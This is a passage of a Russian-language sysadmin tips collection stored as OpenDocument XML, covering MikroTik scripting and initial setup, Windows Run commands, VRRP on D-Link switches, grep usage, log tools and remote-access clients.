      <text:p text:style-name="P2"><text:span text:style-name="T3">Проверьте, не изменился ли </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адрес на интерфейсе. Иногда провайдер выдает динамические </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адреса. Этот скрипт сравнит, изменился ли динамический </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адрес:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:global currentIP;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local newIP [/ip address get [find interface="ether1"] address];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:if ($newIP != $currentIP) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:put "ip address $currentIP changed to $newIP";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:set currentIP $newIP;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Все скрипты:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P19" loext:marker-style-name="T1"><text:span text:style-name="T2">https://wiki.mikrotik.com/wiki/Manual:Scripting-examples</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T3">Шпаргалка по </text:span><text:span text:style-name="T2">run</text:span><text:span text:style-name="T3"> командам </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">msconfig</text:span><text:span text:style-name="T3"> - Системные настройки.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">msinfo</text:span><text:span text:style-name="T3">32 - Информация о системе.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">resmon</text:span><text:span text:style-name="T3"> - Монитор ресурсов.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">main</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Свойства мыши.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mstsc</text:span><text:span text:style-name="T3"> - Подключение к удаленному рабочему столу.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cmd</text:span><text:span text:style-name="T3"> - Командная строка.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">explorer</text:span><text:span text:style-name="T3"> - Проводник </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">taskmgr</text:span><text:span text:style-name="T3"> - Диспетчер задач.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">shutdown</text:span><text:span text:style-name="T3"> - Выключение компьютера.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">chkdsk</text:span><text:span text:style-name="T3"> - Проверка диска.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cleanmgr</text:span><text:span text:style-name="T3"> - Очистка диска.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dxdiag - Параметры</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">powershell - Консоль Windows PowerShell.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">winver - Версия</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">controlfolders - Параметры папок.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">diskmgmt</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Управление дисками.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">eventvwr</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Журнал событий.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">gpedit</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Редактор локальной групповой политики.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">regedit</text:span><text:span text:style-name="T3"> - Редактор реестра.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sysdm</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Свойства системы.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">powercfg</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Параметры питания.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">magnify</text:span><text:span text:style-name="T3"> - Экранная лупа.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">charmap</text:span><text:span text:style-name="T3"> - Таблица символов </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">ncpa</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Сетевые подключения.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mrt</text:span><text:span text:style-name="T3"> - Средство удаления вредоносных программ </text:span><text:span text:style-name="T2">Microsoft</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">devmgmt</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Диспетчер устройств.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netplwiz</text:span><text:span text:style-name="T3"> - Учетные записи пользователей.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">services</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Службы.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">appwiz</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Программы и компоненты.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">control</text:span><text:span text:style-name="T3"> - Панель управления.</text:span></text:p>
      <text:p text:style-name="P1">"." - открыть папку текущего пользователя.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">osk</text:span><text:span text:style-name="T3"> - Экранная клавиатура.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">snippingtool</text:span><text:span text:style-name="T3"> - Ножницы.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdsched</text:span><text:span text:style-name="T3"> - Проверка оперативной памяти</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Настройка протокола </text:span><text:span text:style-name="T2">VRRP</text:span><text:span text:style-name="T3"> на коммутаторах </text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Link</text:span><text:span text:style-name="T3">. Протокол </text:span><text:span text:style-name="T2">VRRP</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">Virtual</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Router</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Redundancy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Protocol</text:span><text:span text:style-name="T3">) позволяет сформировать один виртуальный коммутатор из группы коммутаторов 3-го уровня. Эта группа (</text:span><text:span text:style-name="T2">VRRP</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3">) будет иметь один мастер (</text:span><text:span text:style-name="T2">master</text:span><text:span text:style-name="T3">) и один или более резервных (</text:span><text:span text:style-name="T2">backup</text:span><text:span text:style-name="T3">) коммутаторов. <text:s/>Если мастер выходит из строя, резервный коммутатор становится мастером. Настройки коммутаторов из примера такие:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Swicth A</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2 255.255.255.0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# vrrp 252 ip 192.168.10.252</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# vrrp 253 ip 192.168.10.253</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# end</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Switch B</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3 255.255.255.0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# vrrp 252 ip 192.168.10.252</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# vrrp 253 ip 192.168.10.253</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch</text:span><text:span text:style-name="T3">(</text:span><text:span text:style-name="T2">config</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">if</text:span><text:span text:style-name="T3">)# </text:span><text:span text:style-name="T2">end</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Этот пример подходит для настройки коммутаторов </text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Link</text:span><text:span text:style-name="T3"> со стандартным </text:span><text:span text:style-name="T2">CLI</text:span></text:p>
      <text:p text:style-name="P1">Недавно мы писали про find (https://t.me/i_odmin/4501), сегодня поговорим про grep в Linux как инструмент для администрирования. grep - утилита командной строки, используется для поиска и фильтрации текста в файлах, на основе шаблона, который (шаблон) может быть регулярным выражением.</text:p>
      <text:p text:style-name="P1">grep iodmin</text:p>
      <text:p text:style-name="P1">grep iodmin file.txt поиск iodmin в файле file.txt, с выводом полностью совпавшей строкой</text:p>
      <text:p text:style-name="P1">grep -o iodmin file.txt поиск iodmin в файле file.txt и вывод только совпавшего куска строки</text:p>
      <text:p text:style-name="P1">grep -i iodmin file.txt игнорирование регистра при поиске</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">grep -bn iodmin file.txt показать строку (-n) и столбец (-b), где был найден iodmin</text:span></text:p>
      <text:p text:style-name="P1">grep -v iodmin file.txt инверсия поиска (найдет все строки, которые не совпадают с шаблоном iodmin)</text:p>
      <text:p text:style-name="P1">grep -A 3 iodmin file.txt вывод дополнительных трех строк, после совпавшей</text:p>
      <text:p text:style-name="P1">grep -B 3 iodmin file.txt вывод дополнительных трех строк, перед совпавшей</text:p>
      <text:p text:style-name="P1">grep -C 3 iodmin file.txt вывод три дополнительные строки перед и после совпавшей</text:p>
      <text:p text:style-name="P1">grep -r iodmin $HOME рекурсивный поиск по директории $HOME и всем вложенным</text:p>
      <text:p text:style-name="P1">grep -c iodmin file.txt подсчет совпадений</text:p>
      <text:p text:style-name="P1">grep -L iodmin *.txt вывести список txt-файлов, которые не содержат iodmin</text:p>
      <text:p text:style-name="P1">grep -l iodmin *.txt вывести список txt-файлов, которые содержат iodmin</text:p>
      <text:p text:style-name="P1">grep -w iodmin file.txt совпадение только с полным словом iodmin</text:p>
      <text:p text:style-name="P1">grep -f iodmins.txt file.txt поиск по нескольким iodmin из файла iodmins.txt, шаблоны разделяются новой строкой</text:p>
      <text:p text:style-name="P1">grep -I iodmin file.txt игнорирование бинарных файлов</text:p>
      <text:p text:style-name="P1">grep -v -f file2 file1 &gt; file3 вывод строк, которые есть в file1 и нет в file2</text:p>
      <text:p text:style-name="P1">grep -in -e 'python' `find -type f` рекурсивный поиск файлов, содержащих слово python с выводом номера строки и совпадений</text:p>
      <text:p text:style-name="P1">grep -inc -e 'test' `find -type f` | grep -v :0 рекурсивный поиск файлов, содержащих слово python с выводом количества совпадений</text:p>
      <text:p text:style-name="P1">grep . *.py вывод содержимого всех py-файлов, предваряя каждую строку именем файла</text:p>
      <text:p text:style-name="P1">grep "Http404" apps/**/*.py рекурсивный поиск упоминаний Http404 в директории apps в py-файлах</text:p>
      <text:p text:style-name="P16">Полный мануал по grep есть тут (https://aidalinux.ru/w/Grep)</text:p>
      <text:p text:style-name="P13">Средства анализа и просмотра log-файлов:</text:p>
      <text:p text:style-name="P1">Alco (Apache Log Colorizing Tool) (https://www.linuxpages.org/) - Утилита для подсветки log-файлов web-сервера Apache. Написана на awk.</text:p>
      <text:p text:style-name="P1">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1">Logcheck (https://logcheck.org/) - Простая утилита для фильтрации log-файлов на «не обычные» записи (в.т.ч. и с помощью регулярных выражений) и отправки отчета на e-mail.</text:p>
      <text:p text:style-name="P1">MultiTail (https://github.com/halturin/multitail) - Аналог утилиты tail, позволяющий показывать данные из файлов в нескольких окнах одной консоли. Основан на ncurses.</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">LogMiner (https://logminer.sourceforge.net/) - Мощный анализатор log-файлов для Apache или другого web-сервера, использующего комбинированный </text:span><text:soft-page-break/><text:span text:style-name="T3">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span></text:p>
      <text:p text:style-name="P1">Основы компьютерных сетей:</text:p>
      <text:p text:style-name="P1">Тема №1. Основные сетевые термины и сетевые модели (https://habr.com/ru/post/307252/)</text:p>
      <text:p text:style-name="P1">Тема №2. Протоколы верхнего уровня (https://habr.com/ru/post/307714/)</text:p>
      <text:p text:style-name="P1">Тема №3. Протоколы нижних уровней (транспортного, сетевого и канального) (https://habr.com/ru/post/308636/)</text:p>
      <text:p text:style-name="P1">Тема №4. Сетевые устройства и виды применяемых кабелей (https://habr.com/ru/post/312340/)</text:p>
      <text:p text:style-name="P1">Тема №5. Понятие IP адресации, масок подсетей и их расчет (https://habr.com/ru/post/314484/)</text:p>
      <text:p text:style-name="P1">Тема №6. Понятие VLAN, Trunk и протоколы VTP и DTP (https://habr.com/ru/post/319080/)</text:p>
      <text:p text:style-name="P1">Тема №7. Протокол связующего дерева: STP (https://habr.com/ru/post/321132/)</text:p>
      <text:p text:style-name="P1">Тема №8. Протокол агрегирования каналов: Etherchannel (https://habr.com/ru/post/334778/)</text:p>
      <text:p text:style-name="P7">Тема №9. Маршрутизация: статическая и динамическая на примере RIP, OSPF и EIGRP (https://habr.com/ru/post/335090/)</text:p>
      <text:p text:style-name="P1">Интегрируем ChatGPT в Google Таблицы. OpenAI предоставляют API для ChatGPT, поэтому уже доступно множество сторонних сервисов, которые смогли интегрировать ИИ в свой функционал. Google Документы не остались в стороне. Понадобится только собственный аккаунт ChatGPT, но мы уже писали (https://t.me/c/1102210815/3274) как его сделать. Чтобы встроить ChatGPT:</text:p>
      <text:p text:style-name="P1">1. Установите расширение «GPT for Sheets and Docs (https://workspace.google.com/marketplace/app/gpt_for_sheets_and_docs/677318054654)» из магазина «Google Workspace Marketplace».</text:p>
      <text:p text:style-name="P1">2. Перейдите в Google Таблицы и откройте любой документ.</text:p>
      <text:p text:style-name="P13">3. Во вкладке «Расширения» появится новый аддон, который мы только что установили.</text:p>
      <text:p text:style-name="P13">4. В выпадающем меню выберите опцию «Set API Key». Понадобится ключ API от вашего аккаунта.</text:p>
      <text:p text:style-name="P1">5. Чтобы его создать, пройдите по ссылке (https://help.openai.com/en/articles/4936850-where-do-i-find-my-secret-api-key) и откройте «User Settings».</text:p>
      <text:p text:style-name="P1">6. При необходимости войдите в ваш аккаунт, сгенерируйте новый ключ и скопируйте его в настройки расширения.</text:p>
      <text:p text:style-name="P4">После этих настроек вы можете использовать ChatGPT сразу из документа. В Google Таблицах в любой ячейке введите команду «=GPT(&lt;ваш_запрос&gt;)». Ответ из чата будет вставлен напрямую в ячейку на экране.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Подборка часто используемых команд для первоначальной настройки устройств MikroTik: имя устройства, DNS сервера, Email, время, доступы и т.д.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установки</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">имени</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">устройства</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system identity set name=MyHomeMikrotik</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Установка своих DNS серверов и отключение получения их по DHCP</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip dns set servers=8.8.8.8,1.1.1.1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip dhcp-client set [find ] use-peer-dns=no</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">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 loext:marker-style-name="T1"><text:span text:style-name="T2">#/tool e-mail</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#set address=smtp.yandex.ru from=example@yandex.ru password=example-pass port=587 start-tls=yes user=example@yandex.ru</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system clock set time-zone-autodetect=no</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system clock set time-zone-name=Europe/Moscow</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip cloud set update-time=yes</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Изменение количества строк системного лога</text:p>
      <text:p text:style-name="P1">#/system logging action set memory memory-lines=10000</text:p>
      <text:p text:style-name="P1">Очистка системного лога (оставляет сообщение о смене настроек лога)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system logging action set memory memory-lines=1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system logging action set memory memory-lines=10000</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">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 loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip firewall address-list add address=access.example.con list=DomainIPsAccess</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#add action=accept chain=input src-address-list=DomainIPsAccess</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#comment="Allow DomainIPsAccess"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">#move [find comment="Allow DomainIPsAccess"] 1</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">#move [find comment="Allow DomainIPsAccess"] 0</text:span></text:p>
      <text:p text:style-name="P1">Отключение ненужных служб доступа (web тоже отключается, осторожно)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip service disable www,ftp,api,api-ssl,telnet</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip service enable ssh,winbox</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip service set ssh address=""</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip service set winbox address=""</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Фикс MTU (нужен редко, но метко)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip firewall mangle</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#add chain=postrouting out-interface-list=WAN protocol=tcp tcp-flags=syn,!ack action=change-mss new-mss=clamp-to-pmtu comment="MTU Fix" passthrough=yes</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Заблокировать доступ к WiFi по MAC-адресу</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/interface wireless access-list authentication=no mac-address=8A:EA:B7:2E:38:C1 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Поместить клиента WiFi в отдельный VLAN по MAC-адресу</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/interface wireless access-list</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Настройка пароля и безопасности WiFi на default профиль</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/interface wireless security-profiles set default mode=dynamic-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#wpa2-pre-shared-key=bigpassword</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Включение</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пробросов</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">портов</text:span><text:span text:style-name="T2"> SSH</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip ssh set forwarding-enabled=both</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Подборка часто используемых инструментов удаленного подключения:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">xshell</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">en</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">xshell</text:span><text:span text:style-name="T3">/ - очень мощное программное обеспечение для эмуляции защищенного терминала, которое поддерживает </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">1, </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">2 и протокол </text:span><text:span text:style-name="T2">TELNET</text:span><text:span text:style-name="T3"> платформы </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Xshell</text:span><text:span text:style-name="T3"> можно использовать в интерфейсе </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> для доступа к удаленным серверам на различных системах, тем самым лучше достигая цели терминала удаленного управления.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">vandyke</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3"> - мощное программное обеспечение для эмуляции защищенного терминала, которое может помочь пользователям более безопасно подключаться к удаленным серверам, а также может быть использовано для реализации функций удаленного управления сервером и передачи файлов. </text:span><text:span text:style-name="T2">SecureCRT</text:span><text:span text:style-name="T3"> поддерживает протоколы </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">1, </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">2, </text:span><text:span text:style-name="T2">Telnet</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Rlogin</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Serial</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">SSL</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">TLS</text:span><text:span text:style-name="T3">, которые могут быть использованы для подключения к различным удаленным терминалам, что позволяет удовлетворить различные потребности пользователей.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">winscp</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3">/ - графический клиент </text:span><text:span text:style-name="T2">SFTP</text:span><text:span text:style-name="T3"> с открытым исходным кодом, который использует </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> в среде </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">. Он также поддерживает протокол </text:span><text:span text:style-name="T2">SCP</text:span><text:span text:style-name="T3">. Его основная функция - безопасное копирование и передача файлов между локальным и удаленным компьютерами.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">putty</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/ - легкий клиент </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Telnet</text:span><text:span text:style-name="T3">, который может помочь пользователям подключиться к удаленным серверам, а также поддерживает протокол шифрования аутентификации </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">-2, что может сделать доступ пользователей к сети более безопасным. </text:span><text:span text:style-name="T2">Putty</text:span><text:span text:style-name="T3"> также поддерживает протокол </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> на платформе </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">, что позволяет пользователям лучше контролировать удаленные серверы.</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">mobaxterm</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">mobatek</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3">/ - </text:span><text:span text:style-name="T2">MobaXterm</text:span><text:span text:style-name="T3"> предоставляет комплексные возможности, почти все важные удаленные сетевые инструменты (такие как </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">X</text:span><text:span text:style-name="T3">11, </text:span><text:span text:style-name="T2">RDP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">VNC</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">MOSH</text:span><text:span text:style-name="T3"> и т.д.), а также команды </text:span><text:span text:style-name="T2">Unix</text:span><text:span text:style-name="T3"> на рабочем столе </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> (</text:span><text:span 